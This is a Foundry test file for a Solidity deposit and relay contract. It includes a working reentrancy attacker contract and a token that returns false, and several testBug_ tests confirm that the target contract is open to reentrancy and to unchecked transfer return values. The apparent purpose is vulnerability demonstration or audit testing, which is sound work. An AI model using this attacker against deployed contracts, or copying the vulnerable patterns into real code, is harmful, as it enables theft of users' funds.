// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/Transfer.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract FalseReturnERC20 is IERC20 {
    string public constant name = "False Return Token";
    string public constant symbol = "FALSE";
    uint8 public constant decimals = 18;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address) external pure returns (bool) {
        return false;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false;
    }

    function mint(address to, uint256 amount) external {
        _totalSupply += amount;
        _balances[to] += amount;
        emit Transfer(address(0), to, amount);
    }
}

contract ReentrancyAttacker {
    Transfer public immutable target;
    uint256 public withdrawAmount;
    uint256 public reentryCount;
    uint256 public maxReentries;

    constructor(Transfer _target) {
        target = _target;
    }

    function attack(uint256 depositAmount, uint256 _withdrawAmount, uint256 _maxReentries)
        external
        payable
    {
        withdrawAmount = _withdrawAmount;
        maxReentries = _maxReentries;

        target.deposit{value: depositAmount}();
        target.withdraw(_withdrawAmount);
    }

    receive() external payable {
        if (reentryCount < maxReentries) {
            reentryCount++;
            target.withdraw(withdrawAmount);
        }
    }
}

contract TransferTest is Test {
    Transfer public transferContract;
    MockERC20 public token;
    FalseReturnERC20 public falseToken;
    ReentrancyAttacker public attacker;

    address public owner;
    address public user1;
    address public user2;
    address public relayer;

    function setUp() public {
        owner = address(this);
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        relayer = makeAddr("relayer");

        transferContract = new Transfer();
        token = new MockERC20();
        falseToken = new FalseReturnERC20();
        attacker = new ReentrancyAttacker(transferContract);

        vm.deal(user1, 20 ether);
        vm.deal(user2, 20 ether);
        vm.deal(relayer, 5 ether);
    }

    function testInitialState() public {
        assertEq(transferContract.owner(), owner);
        assertEq(transferContract.balances(user1), 0);
    }

    function testDeposit() public {
        uint256 amount = 2 ether;

        vm.prank(user1);
        transferContract.deposit{value: amount}();

        assertEq(transferContract.balances(user1), amount);
        assertEq(address(transferContract).balance, amount);
    }

    function testWithdraw() public {
        uint256 depositAmount = 3 ether;
        uint256 withdrawAmount = 1 ether;

        vm.prank(user1);
        transferContract.deposit{value: depositAmount}();

        uint256 balanceBefore = user1.balance;
        vm.prank(user1);
        transferContract.withdraw(withdrawAmount);

        assertEq(user1.balance, balanceBefore + withdrawAmount);
        assertEq(transferContract.balances(user1), depositAmount - withdrawAmount);
        assertEq(address(transferContract).balance, depositAmount - withdrawAmount);
    }

    function testRelayTransfer() public {
        uint256 amount = 100 ether;

        token.mint(address(transferContract), amount);

        vm.prank(relayer);
        transferContract.relayTransfer(token, user2, amount);

        assertEq(token.balanceOf(user2), amount);
        assertEq(token.balanceOf(address(transferContract)), 0);
    }

    function testRelayTransferFrom() public {
        uint256 amount = 50 ether;

        token.mint(user1, amount);

        vm.prank(user1);
        token.approve(address(transferContract), amount);

        vm.prank(relayer);
        transferContract.relayTransferFrom(token, user1, user2, amount);

        assertEq(token.balanceOf(user1), 0);
        assertEq(token.balanceOf(user2), amount);
    }

    function test_RevertWhen_ZeroDeposit() public {
        vm.prank(user1);
        vm.expectRevert();
        transferContract.deposit{value: 0}();
    }

    function test_RevertWhen_WithdrawInsufficientBalance() public {
        vm.prank(user1);
        vm.expectRevert();
        transferContract.withdraw(1 ether);
    }

    function test_RevertWhen_RelayTransferFromWithoutApproval() public {
        uint256 amount = 1 ether;
        token.mint(user1, amount);

        vm.prank(relayer);
        vm.expectRevert();
        transferContract.relayTransferFrom(token, user1, user2, amount);
    }

    function testBug_ReentrancyAllowsMultipleWithdrawsInOneCall() public {
        vm.deal(address(attacker), 1 ether);

        vm.prank(user1);
        transferContract.deposit{value: 5 ether}();

        uint256 attackerBalanceBefore = address(attacker).balance;

        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}(1 ether, 0.5 ether, 1);

        uint256 attackerBalanceAfter = address(attacker).balance;

        assertEq(attacker.reentryCount(), 1);
        assertEq(attackerBalanceAfter, attackerBalanceBefore + 1 ether);
        assertEq(transferContract.balances(address(attacker)), 0);
    }

    function testBug_UncheckedTransferReturnValueSilentlyFails() public {
        uint256 amount = 10 ether;
        falseToken.mint(address(transferContract), amount);

        vm.prank(relayer);
        transferContract.relayTransfer(falseToken, user2, amount);

        assertEq(falseToken.balanceOf(address(transferContract)), amount);
        assertEq(falseToken.balanceOf(user2), 0);
    }

    function testBug_UncheckedTransferFromReturnValueSilentlyFails() public {
        uint256 amount = 7 ether;
        falseToken.mint(user1, amount);

        vm.prank(user1);
        falseToken.approve(address(transferContract), amount);

        vm.prank(relayer);
        transferContract.relayTransferFrom(falseToken, user1, user2, amount);

        assertEq(falseToken.balanceOf(user1), amount);
        assertEq(falseToken.balanceOf(user2), 0);
    }
}
